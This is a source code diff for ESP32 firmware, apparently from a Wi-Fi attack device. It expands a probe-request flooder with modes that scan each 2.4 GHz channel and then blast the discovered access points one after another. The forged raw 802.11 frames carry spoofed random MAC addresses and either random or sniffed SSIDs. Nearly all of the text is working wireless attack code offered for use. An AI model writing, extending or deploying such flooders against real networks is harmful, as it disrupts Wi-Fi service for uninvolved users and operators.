@@ -4,28 +4,32 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include "Config.h"
+#include <algorithm>
 
 ProbeFlooder::ProbeFlooder() :
     app_(nullptr),
     isActive_(false),
     currentMode_(ProbeFloodMode::RANDOM),
     currentChannel_(1),
-    ssidReader_(),
+    fileSsidReader_(),
     packetCounter_(0),
+    autoPinpointState_(AutoPinpointState::SCANNING),
+    currentTargetIndex_(-1),
+    lastTargetHopTime_(0),
+    lastScanCount_(0),
+    sniffedSsidIndex_(0),
     lastChannelHopTime_(0),
     channelHopIndex_(0)
 {}
 
-ProbeFlooder::~ProbeFlooder() {
-    // LineReader destructor handles file closing
-}
+ProbeFlooder::~ProbeFlooder() {}
 
 void ProbeFlooder::setup(App* app) {
     app_ = app;
 }
 
-bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, ProbeFloodMode mode, const std::string& ssidFilePath) {
-    if (isActive_ || mode == ProbeFloodMode::PINPOINT_AP) return false;
+bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, ProbeFloodMode mode) {
+    if (isActive_) return false;
     if (!rfLock || !rfLock->isValid()) {
         LOG(LogLevel::ERROR, "PROBE_FLOOD", "Failed to acquire RF hardware lock.");
         return false;
@@ -34,28 +38,56 @@ bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, ProbeF
     
     LOG(LogLevel::INFO, "PROBE_FLOOD", "Starting Probe Flood. Mode: %d", (int)mode);
     currentMode_ = mode;
+    packetCounter_ = 0;
     
     if (currentMode_ == ProbeFloodMode::FILE_BASED) {
-        ssidReader_ = SdCardManager::openLineReader(ssidFilePath.c_str());
-        if (!ssidReader_.isOpen()) {
-            LOG(LogLevel::ERROR, "PROBE_FLOOD", "SSID file is invalid: %s", ssidFilePath.c_str());
+        fileSsidReader_ = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
+        if (!fileSsidReader_.isOpen()) {
+            LOG(LogLevel::ERROR, "PROBE_FLOOD", "SSID file is invalid or not found.");
             rfLock_.reset();
             return false;
         }
+    } else if (currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
+        if (!SdCardManager::exists(SD_ROOT::DATA_PROBES_SSID_SESSION)) {
+            LOG(LogLevel::ERROR, "PROBE_FLOOD", "Sniffed SSID file not found. Run Probe Sniffer first.");
+            rfLock_.reset();
+            return false;
+        }
+        auto reader = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
+        sniffedSsids_.clear();
+        while(reader.isOpen()) {
+            String line = reader.readLine();
+            if (line.isEmpty()) break;
+            sniffedSsids_.push_back(line.c_str());
+        }
+        if (sniffedSsids_.empty()) {
+             LOG(LogLevel::ERROR, "PROBE_FLOOD", "Sniffed SSID file is empty.");
+             rfLock_.reset();
+             return false;
+        }
+        sniffedSsidIndex_ = 0;
+    }
+    
+    if (currentMode_ == ProbeFloodMode::AUTO_BROADCAST_PINPOINT || currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
+        autoPinpointState_ = AutoPinpointState::SCANNING;
+        channelHopIndex_ = 0;
+        currentTargetIndex_ = -1;
+        currentTargetsOnChannel_.clear();
+        lastScanCount_ = app_->getWifiManager().getScanCompletionCount();
+        currentChannel_ = Channels::WIFI_2_4GHZ[channelHopIndex_];
+        app_->getWifiManager().startScanOnChannel(currentChannel_);
+    } else {
+        channelHopIndex_ = 0;
+        currentChannel_ = Channels::WIFI_2_4GHZ[0];
+        esp_wifi_set_channel(currentChannel_, WIFI_SECOND_CHAN_NONE);
+        lastChannelHopTime_ = millis();
     }
 
-    packetCounter_ = 0;
-    channelHopIndex_ = 0;
-    currentChannel_ = Channels::WIFI_2_4GHZ[0];
-    esp_wifi_set_channel(currentChannel_, WIFI_SECOND_CHAN_NONE);
-    lastChannelHopTime_ = millis();
     isActive_ = true;
-    
-    LOG(LogLevel::INFO, "PROBE_FLOOD", "Attack started on Channel %d.", currentChannel_);
+    LOG(LogLevel::INFO, "PROBE_FLOOD", "Attack started.");
     return true;
 }
 
-// --- NEW: Overloaded start for Pinpoint mode ---
 bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, const WifiNetworkInfo& targetNetwork) {
     if (isActive_) return false;
     if (!rfLock || !rfLock->isValid()) {
@@ -70,7 +102,6 @@ bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, const 
     targetAp_ = targetNetwork;
     packetCounter_ = 0;
 
-    // Set the channel to the target's channel and do not hop
     esp_wifi_set_channel(targetAp_.channel, WIFI_SECOND_CHAN_NONE);
     currentChannel_ = targetAp_.channel;
     
@@ -82,31 +113,27 @@ void ProbeFlooder::stop() {
     if (!isActive_) return;
     LOG(LogLevel::INFO, "PROBE_FLOOD", "Stopping probe flood attack.");
     isActive_ = false;
-    ssidReader_.close();
+    fileSsidReader_.close();
+    sniffedSsids_.clear();
     rfLock_.reset();
 }
 
 void ProbeFlooder::loop() {
     if (!isActive_) return;
     
-    // --- MODIFIED: Handle different loop logic for different modes ---
     switch (currentMode_) {
         case ProbeFloodMode::RANDOM:
         case ProbeFloodMode::FILE_BASED: {
-            // Send a burst of packets on each loop iteration for high throughput
             for (int i = 0; i < 20; ++i) {
                 std::string ssid = getNextSsid();
                 if (!ssid.empty()) {
                     sendProbePacket(ssid);
                     packetCounter_++;
                 } else if (currentMode_ == ProbeFloodMode::FILE_BASED) {
-                    // End of file, restart from beginning
-                    ssidReader_.close();
-                    // This assumes the file path is fixed for this attack type in the menu
-                    ssidReader_ = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
+                    fileSsidReader_.close();
+                    fileSsidReader_ = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
                 }
             }
-            // Handle channel hopping
             if (millis() - lastChannelHopTime_ > 250) {
                 channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
                 currentChannel_ = Channels::WIFI_2_4GHZ[channelHopIndex_];
@@ -117,10 +144,46 @@ void ProbeFlooder::loop() {
         }
 
         case ProbeFloodMode::PINPOINT_AP: {
-            // For pinpoint mode, just send packets as fast as possible on the fixed channel
             for (int i = 0; i < 20; ++i) {
-                sendProbePacket(getNextSsid()); // Use random SSIDs to flood
+                sendProbePacket(getNextSsid());
                 packetCounter_++;
+            }
+            break;
+        }
+
+        case ProbeFloodMode::AUTO_BROADCAST_PINPOINT:
+        case ProbeFloodMode::AUTO_SNIFFED_PINPOINT: {
+            if (autoPinpointState_ == AutoPinpointState::SCANNING) {
+                if (app_->getWifiManager().getScanCompletionCount() > lastScanCount_) {
+                    lastScanCount_ = app_->getWifiManager().getScanCompletionCount();
+                    currentTargetsOnChannel_ = app_->getWifiManager().getScannedNetworks();
+                    currentTargetIndex_ = 0;
+                    autoPinpointState_ = AutoPinpointState::FLOODING;
+                    lastTargetHopTime_ = millis();
+                    LOG(LogLevel::INFO, "PROBE_FLOOD", "Scan on CH %d complete. Found %d targets.", currentChannel_, currentTargetsOnChannel_.size());
+                }
+            } else if (autoPinpointState_ == AutoPinpointState::FLOODING) {
+                if (millis() - lastChannelHopTime_ > 5000) { // Flood on one channel for 5 seconds
+                    channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
+                    currentChannel_ = Channels::WIFI_2_4GHZ[channelHopIndex_];
+                    lastScanCount_ = app_->getWifiManager().getScanCompletionCount();
+                    app_->getWifiManager().startScanOnChannel(currentChannel_);
+                    autoPinpointState_ = AutoPinpointState::SCANNING;
+                    LOG(LogLevel::INFO, "PROBE_FLOOD", "Hopping to next channel. Now scanning CH %d.", currentChannel_);
+                    return;
+                }
+
+                if (currentTargetsOnChannel_.empty()) return;
+
+                if (millis() - lastTargetHopTime_ > 500) { // Flood one AP for 500ms
+                    currentTargetIndex_ = (currentTargetIndex_ + 1) % currentTargetsOnChannel_.size();
+                    lastTargetHopTime_ = millis();
+                }
+
+                for (int i = 0; i < 20; ++i) {
+                    sendProbePacket(getNextSsid());
+                    packetCounter_++;
+                }
             }
             break;
         }
@@ -128,10 +191,15 @@ void ProbeFlooder::loop() {
 }
 
 std::string ProbeFlooder::getNextSsid() {
-    if (currentMode_ == ProbeFloodMode::FILE_BASED && ssidReader_.isOpen()) {
-        return ssidReader_.readLine().c_str();
-    } else { // RANDOM and PINPOINT modes use random SSIDs
-        char random_buffer[17]; // Max 16 chars + null
+    if (currentMode_ == ProbeFloodMode::FILE_BASED) {
+        return fileSsidReader_.readLine().c_str();
+    } else if (currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
+        if (sniffedSsids_.empty()) return "";
+        std::string ssid = sniffedSsids_[sniffedSsidIndex_];
+        sniffedSsidIndex_ = (sniffedSsidIndex_ + 1) % sniffedSsids_.size();
+        return ssid;
+    } else { // RANDOM, PINPOINT_AP, and AUTO_BROADCAST_PINPOINT use random SSIDs
+        char random_buffer[17];
         const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
         int ssid_len = 8 + (esp_random() % 9);
         for (int i = 0; i < ssid_len; ++i) {
@@ -143,19 +211,24 @@ std::string ProbeFlooder::getNextSsid() {
 }
 
 void ProbeFlooder::sendProbePacket(const std::string& ssid) {
+    if (ssid.empty()) return;
     uint8_t packet_buffer[128];
     memcpy(packet_buffer, RawFrames::Mgmt::ProbeRequest::TEMPLATE, sizeof(RawFrames::Mgmt::ProbeRequest::TEMPLATE));
 
-    // --- MODIFIED: Set destination and BSSID based on mode ---
-    if (currentMode_ == ProbeFloodMode::PINPOINT_AP) {
-        // Destination address = Target AP's BSSID
-        memcpy(&packet_buffer[4], targetAp_.bssid, 6);
-        // BSSID field = Target AP's BSSID
-        memcpy(&packet_buffer[16], targetAp_.bssid, 6);
-    }
-    // For other modes, the broadcast address from the template is used by default.
+    if (currentMode_ == ProbeFloodMode::PINPOINT_AP || currentMode_ == ProbeFloodMode::AUTO_BROADCAST_PINPOINT || currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) {
+        const WifiNetworkInfo* currentTarget = nullptr;
+        if (currentMode_ == ProbeFloodMode::PINPOINT_AP) {
+            currentTarget = &targetAp_;
+        } else if (!currentTargetsOnChannel_.empty() && currentTargetIndex_ < currentTargetsOnChannel_.size()) {
+            currentTarget = &currentTargetsOnChannel_[currentTargetIndex_];
+        }
 
-    // Set random source MAC address
+        if (currentTarget) {
+            memcpy(&packet_buffer[4], currentTarget->bssid, 6);
+            memcpy(&packet_buffer[16], currentTarget->bssid, 6);
+        }
+    }
+
     for (int i = 0; i < 6; i++) {
         packet_buffer[10 + i] = esp_random() & 0xFF;
     }
@@ -164,8 +237,7 @@ void ProbeFlooder::sendProbePacket(const std::string& ssid) {
     uint8_t ssid_len = std::min((int)ssid.length(), 32);
     
     uint8_t* p = packet_buffer + sizeof(RawFrames::Mgmt::ProbeRequest::TEMPLATE);
-    *p++ = 0; // Tag: SSID
-    *p++ = ssid_len;
+    *p++ = 0; *p++ = ssid_len;
     memcpy(p, ssid.c_str(), ssid_len);
     p += ssid_len;
     
@@ -173,12 +245,22 @@ void ProbeFlooder::sendProbePacket(const std::string& ssid) {
     p += sizeof(RawFrames::Mgmt::ProbeRequest::POST_SSID_TAGS);
 
     int total_len = p - packet_buffer;
-    
     esp_wifi_80211_tx(WIFI_IF_STA, packet_buffer, total_len, false);
 }
 
 bool ProbeFlooder::isActive() const { return isActive_; }
 uint32_t ProbeFlooder::getPacketCounter() const { return packetCounter_; }
 int ProbeFlooder::getCurrentChannel() const { return currentChannel_; }
-const WifiNetworkInfo& ProbeFlooder::getTargetAp() const { return targetAp_; }
 ProbeFloodMode ProbeFlooder::getMode() const { return currentMode_; }
+AutoPinpointState ProbeFlooder::getAutoPinpointState() const { return autoPinpointState_; }
+
+const std::string ProbeFlooder::getCurrentTargetSsid() const {
+    if (currentMode_ == ProbeFloodMode::PINPOINT_AP) {
+        return targetAp_.ssid;
+    }
+    if ((currentMode_ == ProbeFloodMode::AUTO_BROADCAST_PINPOINT || currentMode_ == ProbeFloodMode::AUTO_SNIFFED_PINPOINT) 
+        && !currentTargetsOnChannel_.empty() && currentTargetIndex_ < currentTargetsOnChannel_.size()) {
+        return currentTargetsOnChannel_[currentTargetIndex_].ssid;
+    }
+    return "N/A";
+}
